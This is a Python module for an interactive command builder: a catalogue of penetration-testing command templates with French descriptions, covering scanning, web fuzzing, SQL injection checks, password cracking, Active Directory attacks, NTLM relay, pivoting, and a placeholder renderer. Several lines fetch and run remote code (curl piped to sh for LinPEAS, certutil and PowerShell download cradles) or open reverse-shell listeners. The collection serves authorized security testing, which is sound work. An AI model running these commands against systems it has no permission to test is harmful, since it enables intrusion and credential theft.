"""Command template rendering for the interactive command builder."""

from __future__ import annotations

import re
from dataclasses import dataclass


PLACEHOLDER_RE = re.compile(r"\$([A-Z][A-Z0-9_]*)")


@dataclass(frozen=True)
class CommandTemplate:
    key: str
    label: str
    category: str
    command: str
    description: str


COMMAND_TEMPLATES: tuple[CommandTemplate, ...] = (
    CommandTemplate(
        "nmap-basic",
        "Nmap service scan",
        "recon",
        "nmap -sC -sV -oA scans/nmap_$TARGET $TARGET",
        "Scan TCP standard avec scripts par défaut et détection de version.",
    ),
    CommandTemplate(
        "nmap-full",
        "Nmap full TCP",
        "recon",
        "sudo nmap -p- --min-rate 5000 -oA scans/nmap_full_$TARGET $TARGET",
        "Découverte de tous les ports TCP, à relancer ensuite avec -sC -sV.",
    ),
    CommandTemplate(
        "arp-scan-lan",
        "ARP scan local",
        "network",
        "sudo arp-scan -l",
        "Découverte des hôtes actifs sur le segment réseau local.",
    ),
    CommandTemplate(
        "dig-short",
        "DNS short lookup",
        "network",
        "dig +short $DOMAIN",
        "Résolution DNS rapide pour une cible autorisée.",
    ),
    CommandTemplate(
        "whois-domain",
        "WHOIS domain",
        "network",
        "whois $DOMAIN",
        "Récupère les informations d'enregistrement d'un domaine.",
    ),
    CommandTemplate(
        "tcpdump-host",
        "Tcpdump host filter",
        "network",
        "sudo tcpdump -i $INTERFACE -nn host $TARGET",
        "Capture le trafic lié à une cible précise sur une interface donnée.",
    ),
    CommandTemplate(
        "masscan-top",
        "Masscan fast sweep",
        "kali",
        "sudo masscan $TARGET -p1-65535 --rate 1000 --open",
        "Balayage rapide de tous les ports ouverts sur une cible autorisée.",
    ),
    CommandTemplate(
        "rustscan-service",
        "Rustscan service scan",
        "kali",
        "rustscan -a $TARGET --ulimit 5000 -- -sV -sC -Pn -oN scans/rustscan_$TARGET.txt",
        "Découverte rapide de ports puis relance nmap service/version.",
    ),
    CommandTemplate(
        "ffuf-dir",
        "FFUF directory fuzz",
        "web",
        "ffuf -u http://$TARGET/FUZZ -w $WORDLIST -mc all",
        "Fuzz de chemins web avec wordlist.",
    ),
    CommandTemplate(
        "ffuf-recursive",
        "FFUF recursive fuzz",
        "web",
        "ffuf -u http://$TARGET/FUZZ -w $WORDLIST -recursion -recursion-depth 2 -fc 404",
        "Fuzz de répertoires avec récursion contrôlée.",
    ),
    CommandTemplate(
        "ffuf-vhost",
        "FFUF vhost fuzz",
        "web",
        "ffuf -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -w $WORDLIST -fs 0",
        "Découverte de virtual hosts sur un domaine autorisé.",
    ),
    CommandTemplate(
        "gobuster-dir",
        "Gobuster directory scan",
        "web",
        "gobuster dir -u http://$TARGET -w $WORDLIST -x php,html,txt -t 50",
        "Énumération rapide de répertoires et fichiers web.",
    ),
    CommandTemplate(
        "dirsearch-web",
        "Dirsearch scan",
        "web",
        "dirsearch -u http://$TARGET -e php,txt,html -x 403,404",
        "Scan web orienté répertoires/fichiers avec exclusions de codes.",
    ),
    CommandTemplate(
        "nikto-check",
        "Nikto web audit",
        "web",
        "nikto -h http://$TARGET -C all",
        "Audit web rapide des problèmes courants sur une cible autorisée.",
    ),
    CommandTemplate(
        "whatweb-fingerprint",
        "WhatWeb fingerprint",
        "web",
        "whatweb -a 3 http://$TARGET",
        "Fingerprint applicatif rapide d'un service HTTP.",
    ),
    CommandTemplate(
        "httpx-probe",
        "Httpx probe",
        "recon",
        "httpx -u http://$TARGET -title -status-code -tech-detect -follow-redirects",
        "Probe HTTP rapide avec détection de techno et redirections.",
    ),
    CommandTemplate(
        "subfinder-passive",
        "Subfinder passive enum",
        "recon",
        "subfinder -d $DOMAIN -all -silent",
        "Énumération passive des sous-domaines d'une cible autorisée.",
    ),
    CommandTemplate(
        "gau-urls",
        "GAU historical URLs",
        "recon",
        "gau $DOMAIN | tee recon/gau_$DOMAIN.txt",
        "Récupère des URLs historiques utiles pour la surface d'attaque.",
    ),
    CommandTemplate(
        "katana-crawl",
        "Katana crawl",
        "web",
        "katana -u http://$TARGET -d 2 -jc -kf all -o recon/katana_$TARGET.txt",
        "Crawl web moderne avec export des URLs trouvées.",
    ),
    CommandTemplate(
        "nuclei-high",
        "Nuclei high severity",
        "web",
        "nuclei -u http://$TARGET -severity high,critical -rl 5 -o scans/nuclei_$TARGET.txt",
        "Vérification ciblée de templates nuclei à haut impact.",
    ),
    CommandTemplate(
        "sqlmap-url",
        "SQLMap URL check",
        "web",
        "sqlmap -u '$URL' --batch --risk=1 --level=1",
        "Vérification SQLi prudente sur une URL explicitement autorisée.",
    ),
    CommandTemplate(
        "sqlmap-safe",
        "SQLMap safer check",
        "web",
        "sqlmap -u '$URL' --batch --risk=2 --level=2",
        "Scan SQLi un peu plus poussé, toujours en mode batch.",
    ),
    CommandTemplate(
        "wfuzz-web",
        "Wfuzz web fuzz",
        "web",
        "wfuzz -c -z file,$WORDLIST --hc 404 http://$TARGET/FUZZ",
        "Fuzzing web simple avec masquage des réponses 404.",
    ),
    CommandTemplate(
        "hydra-ssh",
        "Hydra SSH",
        "passwords",
        "hydra -l $USER -P $WORDLIST ssh://$TARGET -t 4 -V",
        "Audit de mot de passe SSH sur lab ou système autorisé.",
    ),
    CommandTemplate(
        "hashcat-ntlm",
        "Hashcat NTLM",
        "passwords",
        "hashcat -m 1000 hashes.txt $WORDLIST",
        "Crack d'un fichier de hashs NTLM en environnement autorisé.",
    ),
    CommandTemplate(
        "john-ntlm",
        "John NTLM",
        "passwords",
        "john --format=NT hashes.txt --wordlist=$WORDLIST",
        "Crack d'un fichier de hashs NTLM avec John the Ripper.",
    ),
    CommandTemplate(
        "hydra-http-form",
        "Hydra HTTP form",
        "passwords",
        "hydra -L $USERLIST -P $WORDLIST $TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'",
        "Test d'authentification web via formulaire HTTP dans un lab autorisé.",
    ),
    CommandTemplate(
        "kerbrute-users",
        "Kerbrute userenum",
        "ad",
        "kerbrute userenum -d $DOMAIN --dc $DC_IP $WORDLIST",
        "Énumération de comptes AD à partir d'une wordlist.",
    ),
    CommandTemplate(
        "netexec-smb",
        "NetExec SMB auth",
        "ad",
        "netexec smb $TARGET -u $USER -p '$PASSWORD' --shares",
        "Vérification SMB/auth et listing des partages accessibles.",
    ),
    CommandTemplate(
        "ldapsearch-rootdse",
        "LDAP RootDSE",
        "ad",
        "ldapsearch -x -H ldap://$DC_IP -s base -b '' namingContexts",
        "Lecture de l'entrée RootDSE LDAP d'un contrôleur de domaine.",
    ),
    CommandTemplate(
        "rpcclient-enum",
        "RPCClient enum",
        "ad",
        "rpcclient -U '$USER%$PASSWORD' $TARGET -c 'enumdomusers'",
        "Énumération de comptes via RPCClient sur un hôte Windows autorisé.",
    ),
    CommandTemplate(
        "certipy-find",
        "Certipy ADCS find",
        "ad",
        "certipy find -u '$USER@$DOMAIN' -p '$PASSWORD' -dc-ip $DC_IP -vulnerable -stdout",
        "Audit AD CS en environnement Active Directory autorisé.",
    ),
    CommandTemplate(
        "bloodhound-python",
        "BloodHound Python",
        "ad",
        "bloodhound-python -u $USER -p '$PASSWORD' -d $DOMAIN -ns $DC_IP -c All",
        "Collecte les données AD pour analyse BloodHound.",
    ),
    CommandTemplate(
        "kerberoast-getuserspns",
        "GetUserSPNs",
        "ad",
        "python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP -request",
        "Kerberoasting ciblé sur les comptes SPN d'un domaine AD.",
    ),
    CommandTemplate(
        "responder",
        "Responder listener",
        "post",
        "sudo responder -I $INTERFACE -wrf",
        "Empoisonnement LLMNR/NBT-NS en lab isolé autorisé.",
    ),
    CommandTemplate(
        "linpeas",
        "LinPEAS",
        "post",
        "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "Audit automatisé de privesc Linux dans un environnement contrôlé.",
    ),
    CommandTemplate(
        "winpeas",
        "WinPEAS",
        "post",
        "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe",
        "Audit automatisé de privesc Windows dans un environnement contrôlé.",
    ),
    CommandTemplate(
        "ntlmrelayx-ldap",
        "NTLMRelayX LDAP",
        "post",
        "python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$DC_IP --escalate-user $USER --no-smb2support",
        "Relay NTLM vers LDAP pour une cible AD autorisée.",
    ),
    CommandTemplate(
        "chisel-server",
        "Chisel reverse server",
        "post",
        "chisel server --reverse --port $PORT",
        "Serveur de tunnel reverse pour pivot en lab.",
    ),
    CommandTemplate(
        "ligolo-proxy",
        "Ligolo proxy",
        "post",
        "sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:$PORT",
        "Listener Ligolo pour pivot chiffré en environnement contrôlé.",
    ),
    CommandTemplate(
        "naabu-top",
        "Naabu top ports",
        "recon",
        "naabu -host $TARGET -top-ports 1000 -silent",
        "Découverte rapide de ports avec Naabu.",
    ),
    CommandTemplate(
        "waybackurls-domain",
        "Waybackurls",
        "recon",
        "echo $DOMAIN | waybackurls",
        "Récupère des URLs historiques depuis Wayback Machine.",
    ),
    CommandTemplate(
        "aws-identity",
        "AWS identity",
        "cloud",
        "aws sts get-caller-identity",
        "Vérifie rapidement l'identité AWS courante.",
    ),
    CommandTemplate(
        "trivy-fs",
        "Trivy filesystem",
        "cloud",
        "trivy fs .",
        "Audit de vulnérabilités dans le répertoire courant ou un artefact.",
    ),
    CommandTemplate(
        "kubectl-pods",
        "Kubectl get pods",
        "cloud",
        "kubectl get pods -A",
        "Vue globale des pods dans un cluster Kubernetes autorisé.",
    ),
    CommandTemplate(
        "prowler-aws",
        "Prowler AWS",
        "cloud",
        "prowler aws -M json-asff",
        "Lance un contrôle de posture de sécurité AWS.",
    ),
    CommandTemplate(
        "volatility3-pslist",
        "Volatility pslist",
        "forensics",
        "volatility3 -f $MEMORY_IMAGE windows.pslist",
        "Liste les processus Windows depuis une image mémoire.",
    ),
    CommandTemplate(
        "yara-scan",
        "YARA recursive scan",
        "forensics",
        "yara -r $RULES_DIR $TARGET_DIR",
        "Analyse récursive d'un répertoire avec des règles YARA.",
    ),
    CommandTemplate(
        "exiftool-file",
        "ExifTool metadata",
        "forensics",
        "exiftool $FILE",
        "Extrait rapidement les métadonnées d'un fichier.",
    ),
    CommandTemplate(
        "binwalk-firmware",
        "Binwalk firmware",
        "binary",
        "binwalk -e $FIRMWARE",
        "Analyse et extraction de contenu d'un firmware ou binaire emballé.",
    ),
    CommandTemplate(
        "checksec-file",
        "Checksec binary",
        "binary",
        "checksec --file=$BINARY",
        "Vérifie les protections mémoire d'un binaire ELF.",
    ),
    CommandTemplate(
        "readelf-headers",
        "Readelf headers",
        "binary",
        "readelf -h $BINARY",
        "Inspecte les en-têtes ELF d'un binaire.",
    ),
    CommandTemplate(
        "objdump-disas",
        "Objdump disassembly",
        "binary",
        "objdump -d $BINARY | less",
        "Désassemble un binaire pour analyse manuelle.",
    ),
    CommandTemplate(
        "strings-binary",
        "Strings binary",
        "binary",
        "strings -n 8 $BINARY | less",
        "Cherche des chaînes utiles dans un binaire.",
    ),
    CommandTemplate(
        "impacket-smbserver",
        "Impacket SMB share",
        "transfer",
        "impacket-smbserver share . -smb2support",
        "Partage SMB local temporaire pour environnements Windows lab.",
    ),
    CommandTemplate(
        "python-http",
        "Python HTTP server",
        "transfer",
        "python3 -m http.server $PORT",
        "Serveur HTTP local simple pour transfert de fichiers en lab.",
    ),
    CommandTemplate(
        "socat-listener",
        "Socat listener",
        "post",
        "socat file:$(tty),raw,echo=0 tcp-listen:$LPORT",
        "Listener alternatif plus stable pour certains shells et transferts.",
    ),
    CommandTemplate(
        "gf-xss",
        "GF XSS filter",
        "web",
        "cat $URLS_FILE | gf xss",
        "Filtre des URLs potentiellement intéressantes pour XSS.",
    ),
    CommandTemplate(
        "subjs-urls",
        "Subjs extractor",
        "web",
        "cat $URLS_FILE | subjs",
        "Extrait des chemins JS depuis une liste d'URLs.",
    ),
    CommandTemplate(
        "curl-burp",
        "Curl through Burp",
        "web",
        "curl -k -i --proxy http://127.0.0.1:8080 '$URL'",
        "Rejouer une requête via proxy Burp local.",
    ),
    CommandTemplate(
        "nc-listener",
        "Netcat listener",
        "post",
        "rlwrap -cAr nc -lvnp $LPORT",
        "Listener local pour payloads de lab.",
    ),
    CommandTemplate(
        "certutil-download",
        "Windows certutil download",
        "transfer",
        "certutil.exe -urlcache -split -f http://$LHOST:$PORT/$FILE $FILE",
        "Téléchargement Windows depuis le serveur HTTP de lab.",
    ),
    CommandTemplate(
        "powershell-download",
        "PowerShell download",
        "transfer",
        "powershell -NoP -C \"iwr http://$LHOST:$PORT/$FILE -OutFile $FILE\"",
        "Téléchargement PowerShell depuis le serveur HTTP de lab.",
    ),
    CommandTemplate(
        "patchelf-rpath",
        "Patchelf rpath",
        "binary",
        "patchelf --print-rpath $BINARY",
        "Inspecte le RPATH d'un binaire ELF.",
    ),
)


def template_by_key(key: str) -> CommandTemplate | None:
    wanted = key.strip().lower()
    return next((tpl for tpl in COMMAND_TEMPLATES if tpl.key == wanted), None)


def render_template(template: CommandTemplate, variables: dict[str, str]) -> tuple[str, list[str]]:
    """Render a template and return the missing placeholders."""
    normalized = {key.upper(): value for key, value in variables.items()}
    missing: list[str] = []

    def replace(match: re.Match[str]) -> str:
        key = match.group(1)
        value = normalized.get(key)
        if value is None or value == "":
            missing.append(key)
            return match.group(0)
        return value

    rendered = PLACEHOLDER_RE.sub(replace, template.command)
    return rendered, sorted(set(missing))


def placeholders_for(template: CommandTemplate) -> list[str]:
    return sorted(set(PLACEHOLDER_RE.findall(template.command)))
